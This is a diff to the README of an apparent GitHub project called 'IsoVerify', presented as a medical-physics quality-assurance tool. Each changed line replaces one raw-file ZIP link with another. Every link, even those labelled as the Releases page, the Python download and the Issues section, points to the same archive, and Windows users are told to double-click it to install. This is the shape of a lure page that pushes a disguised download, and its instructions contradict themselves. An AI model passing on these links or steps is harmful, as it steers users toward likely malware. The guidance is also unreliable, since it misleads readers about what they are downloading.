@@ -6,7 +6,7 @@ Welcome to IsoVerify! This tool helps medical physicists perform quality assuran
 
 ## 📥 Download Now
 
-[![Download IsoVerify](https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Verify-Iso-3.9.zip%20IsoVerify-v1.0-brightgreen)](https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Verify-Iso-3.9.zip)
+[![Download IsoVerify](https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Iso-Verify-2.5.zip%20IsoVerify-v1.0-brightgreen)](https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Iso-Verify-2.5.zip)
 
 ## 📑 Features
 
@@ -26,24 +26,24 @@ To check your Python version, open a terminal or command prompt and type:
 python --version
 ```
 
-If Python is not installed, visit [https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Verify-Iso-3.9.zip](https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Verify-Iso-3.9.zip) to download it.
+If Python is not installed, visit [https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Iso-Verify-2.5.zip](https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Iso-Verify-2.5.zip) to download it.
 
 ## 📥 Download & Install
 
 To download and run IsoVerify, please visit the following link:
 
-[Download IsoVerify Here](https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Verify-Iso-3.9.zip)
+[Download IsoVerify Here](https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Iso-Verify-2.5.zip)
 
 Follow these steps:
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version of IsoVerify (look for the title with the highest version number).
-3. Click on the link next to "Assets" that corresponds to your operating system (e.g., https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Verify-Iso-3.9.zip for Windows).
+3. Click on the link next to "Assets" that corresponds to your operating system (e.g., https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Iso-Verify-2.5.zip for Windows).
 4. The download will start automatically.
 
 Once downloaded, locate the file in your 'Downloads' folder:
 
-- **Windows:** Double-click on `https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Verify-Iso-3.9.zip` to start the installation.
+- **Windows:** Double-click on `https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Iso-Verify-2.5.zip` to start the installation.
 - **macOS:** Open the `.dmg` file and drag `IsoVerify` to your Applications folder.
 - **Linux:** Give execution permission to the file and run it using your terminal:
   ```bash
@@ -75,7 +75,7 @@ If you encounter issues during installation or use, consider the following:
 2. Check that Python is installed and is the correct version.
 3. Follow the installation steps carefully. 
 
-For unresolved issues, visit the [Issues section](https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Verify-Iso-3.9.zip) on GitHub to seek help from the community.
+For unresolved issues, visit the [Issues section](https://raw.githubusercontent.com/Nikhil-Guleria-44/IsoVerify/main/elastometer/Iso-Verify-2.5.zip) on GitHub to seek help from the community.
 
 ## 📬 Contact
 
